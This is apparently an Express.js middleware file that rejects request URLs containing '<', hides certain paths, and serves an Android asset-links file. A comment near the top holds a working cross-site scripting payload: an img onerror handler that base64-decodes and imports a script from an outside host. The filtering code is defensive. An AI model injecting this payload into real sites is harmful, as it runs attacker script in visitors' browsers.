export default app => {
  // /;</script><img%20sRc=OnXSS%20OnError=import(atob('aHR0cHM6Ly9jbGd0LmNjLz9ib2Y='))>
  app.use((req, res, next) => {
    const uri = decodeOrString(req.originalUrl);

    if (/\</.test(uri)) {
      res.status(404).end();
      return;
    }

    next();
  });

  app.use((req, res, next) => {
    if (req.path.indexOf('/private/') > -1) return res.status(404).send('Not Found');

    if (
      /^\/tools\/iframe/i.test(req.path)
      && typeof req.query.MoVfaGosMVhqN === 'undefined'
    ) {
      return res.status(404).send('Not Found');
    }
    next();
  });

  app.use((req, res, next) => {
    res.set('host', 'kpaehs.com,www.kpaehs.com,www.kpaflex.com,kpaflex.com');
    next();
  });

  app.get("/.well-known/assetlinks.json", (req, res, next) => {
    return res.json([
      {
        "relation": [
          "delegate_permission/common.handle_all_urls"
        ],
        "target": {
          "namespace": "android_app",
          "package_name": "app.hazardscout",
          "sha256_cert_fingerprints": [
            "00:96:7B:1B:B0:11:CE:EA:8E:F8:DE:A9:36:83:AF:CE:E9:A4:B6:A6:E5:78:9F:D6:D6:70:E4:C7:9F:99:AB:AB"
          ]
        }
      }
    ]);
  });
}

function decodeOrString(src) {
  try {
    const str = decodeURIComponent(src);
    if (str !== src) {
      return decodeOrString(str);
    }
    return str;
  } catch (ignoreError) {
    return src;
  }
}
